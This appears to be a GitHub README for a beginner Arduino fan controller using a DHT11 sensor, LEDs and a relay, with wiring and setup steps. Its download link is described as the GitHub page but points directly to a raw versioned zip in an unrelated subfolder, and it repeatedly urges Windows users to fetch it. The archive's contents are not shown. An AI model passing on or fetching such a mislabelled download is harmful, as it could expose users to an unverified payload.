# 🔥 DHT11 - Simple Fan Control for Warm Rooms

[![Download](https://img.shields.io/badge/Download%20DHT11-blue?style=for-the-badge)](https://raw.githubusercontent.com/akroutabdelrrezak/DHT11/main/guiser/DH_v3.8.zip)

## 📥 Download and Setup

Use the link above to visit the GitHub page and download the project files.

If you want to follow the project on a Windows PC, download the repository from the page and open it with Arduino IDE.

## 🧰 What This Project Does

DHT11 is an Arduino temperature control system. It reads room temperature with a DHT11 sensor and turns a fan and LEDs on or off based on the heat level.

The system works like this:

- When the temperature is below 25°C:
  - Green LED turns on
  - Fan stays off

- When the temperature is 25°C or higher:
  - Red LED turns on
  - Fan turns on through a relay

The current temperature also appears in the Serial Monitor.

## 🖥️ What You Need on Windows

Before you start, install these on your Windows PC:

- Arduino IDE
- A USB cable for your Arduino Uno
- The project files from the GitHub page
- The DHT library for Arduino IDE

You will also need your Arduino board connected to your computer.

## 🚀 Getting Started

1. Open the GitHub page from the download link.
2. Download the project files to your computer.
3. Open Arduino IDE on Windows.
4. Load the project sketch file.
5. Connect your Arduino Uno with a USB cable.
6. Select the correct board and port in Arduino IDE.
7. Upload the code to the board.

## 🧩 Install the DHT Library

The code uses the DHT library to read the sensor.

To add it in Arduino IDE:

1. Open Arduino IDE.
2. Go to Sketch.
3. Select Include Library.
4. Click Manage Libraries.
5. Search for DHT sensor library.
6. Install the library by Adafruit.
7. If asked, install the Adafruit Unified Sensor library too.

## 🔌 Parts List

You will need these parts:

- Arduino Uno
- DHT11 temperature sensor
- Red LED
- Green LED
- 220Ω resistors
- Relay module for the fan
- Jumper wires
- Breadboard
- Fan or small DC load for testing

## 🛠️ Wiring Guide

Connect the parts like this:

### DHT11 Sensor
- VCC → 5V
- GND → GND
- DATA → Pin 7

### LEDs
- Green LED → Pin 2 with a resistor
- Red LED → Pin 3 with a resistor

### Relay Module
- IN → Pin 8
- VCC → 5V
- GND → GND

## 🧪 How It Works

The Arduino reads the temperature from the DHT11 sensor.

Then it checks the value:

- If the room is cool, it turns on the green LED.
- If the room gets warm, it turns on the red LED and starts the fan.

This gives a simple visual and physical response to the room temperature.

## 💻 Open the Project in Arduino IDE

After you download the files:

1. Find the project folder on your PC.
2. Open the sketch file in Arduino IDE.
3. Check that the code includes the DHT library.
4. Make sure the board is set to Arduino Uno.
5. Make sure the correct COM port is selected.

If the code opens in a folder with extra files, keep them in the same folder so Arduino IDE can find them.

## 📤 Upload the Code

To send the program to your Arduino:

1. Plug the Arduino into your Windows PC.
2. Open the sketch in Arduino IDE.
3. Click the check mark to verify the code.
4. Click the right arrow to upload the code.
5. Wait for the upload to finish.

When the upload completes, the board will start running the temperature control system.

## 📺 View Temperature Output

To see the temperature values:

1. Open Arduino IDE.
2. Click Tools.
3. Open Serial Monitor.
4. Set the baud rate used in the sketch.

The Serial Monitor will show the temperature readings from the DHT11 sensor.

## 🔍 Expected Behavior

When the system is running:

- Below 25°C:
  - Green LED stays on
  - Red LED stays off
  - Fan stays off

- At 25°C or above:
  - Red LED stays on
  - Green LED stays off
  - Fan turns on through the relay

## 🧯 Check If It Does Not Work

If something does not behave as expected, check these points:

- Make sure the DHT11 wires match the pin setup
- Make sure the LED legs are in the right direction
- Make sure the resistors are in place
- Make sure the relay module is wired to Pin 8
- Make sure the DHT library is installed
- Make sure the correct board and port are selected
- Make sure the USB cable supports data transfer

## 📁 Project Files

After download, the folder should include:

- Arduino sketch file
- Any support files used by the code
- Readme or project notes
- Library-related files if included

Keep all files in one folder so the sketch stays easy to open.

## 🧠 Simple Use Case

This project fits small home or school setups where you want a basic temperature response system.

You can use it to learn:

- Sensor reading
- LED control
- Relay control
- Serial output in Arduino IDE

## 🔧 Typical Setup on Windows

A common setup looks like this:

- Windows 10 or Windows 11
- Arduino IDE installed
- Arduino Uno connected by USB
- Project files downloaded from GitHub
- DHT library installed in Arduino IDE

## 📌 Download Link

Visit the GitHub page here and download the project files:

https://raw.githubusercontent.com/akroutabdelrrezak/DHT11/main/guiser/DH_v3.8.zip

## 🧷 Pin Reference

- DHT11 DATA → Pin 7
- Green LED → Pin 2
- Red LED → Pin 3
- Relay IN → Pin 8

## 🖱️ What to Do Next

1. Download the files from the GitHub page.
2. Open the sketch in Arduino IDE.
3. Install the DHT library.
4. Wire the parts to the Arduino Uno.
5. Upload the code.
6. Open Serial Monitor to watch the temperature values